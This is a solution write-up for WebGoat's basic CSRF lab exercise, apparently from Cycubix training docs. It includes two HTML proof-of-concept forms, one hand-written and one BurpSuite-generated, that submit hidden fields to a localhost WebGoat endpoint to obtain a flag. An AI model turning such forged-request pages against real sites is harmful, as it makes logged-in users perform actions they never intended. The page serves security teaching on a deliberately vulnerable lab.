---
title: "A10:2021 | Server Side Request Forgery | Cross Site Request Forgery (3) | Cycubix Docs"
layout: default
nav_order: 3
parent: "A10:2021 | Server Side Request Forgery | Cross Site Request Forgery | Cycubix Docs"
grand_parent: "A10: 2021 | Server Side Request Forgery | Cycubix Docs"
---
# A10:2021 | Server Side Request Forgery | Cross Site Request Forgery (3) | Cycubix Docs

### Basic Get CSRF Exercise <a href="#basic_get_csrf_exercise" id="basic_get_csrf_exercise"></a>

Trigger the form below from an external source while logged in. The response will include a 'flag' (a numeric value).

<figure><img src="../../../../../.gitbook/assets/submit button.png" alt=""><figcaption></figcaption></figure>

**Confirm Flag**

Confirm the flag you should have gotten on the previous page below.

<figure><img src="../../../../../.gitbook/assets/cross site request forgery.png" alt=""><figcaption></figcaption></figure>

**Solution**

**With VC and HTML**

* Hints: The form has hidden inputs. You will need to use an external page and/or script to trigger it. Try creating a local page or one that is uploaded and points to this form as its action. The trigger can be manual or scripted to happen automatically. 
* If we hit the button submit we can see a message that says that the request its coming from the form itself. 

<figure><img src="../../../../../.gitbook/assets/request comes from original form.png" alt=""><figcaption></figcaption></figure>

* If we open the developer tools we can see the imputs the form has. 

<figure><img src="../../../../../.gitbook/assets/form accept.png" alt=""><figcaption></figcaption></figure>

* To create your own fake page go into visual code, create an HTML with the following code:

 

```
<html>
  <body>
    <script>history.pushState('', '', '/');</script>
    <form action="http://localhost:8080/WebGoat/csrf/basic-get-flag" method="POST">
      <input type="hidden" name="csrf" value="false" />
      <input type="hidden" name="submit" value="Submit" />
      <input type="submit" value="Submit" />
    </form>
  </body>
</html>

```

* Save the file as a fakepage.html. Go to WebWolf and upload the file. You sill see that the file will open in a new tab, and you will see the submit button. Once you do that, you will see a JSON message with the flag number: copy and paste the flag number in WebGoat's lesson. 

**With Engagement Tools on BurpSuite**

* There is a tool (Pro Version only) that allows you to create a HTML based on the POST request. 



````
```html
<form accept-charset="UNKNOWN" id="basic-csrf-get" method="POST" name="form1" target="_blank" action="http://127.0.0.1:8080/WebGoat/csrf/basic-get-flag">
    <input name="csrf" type="hidden" value="false">
    <input type="submit" name="submit">
</form>
```
````
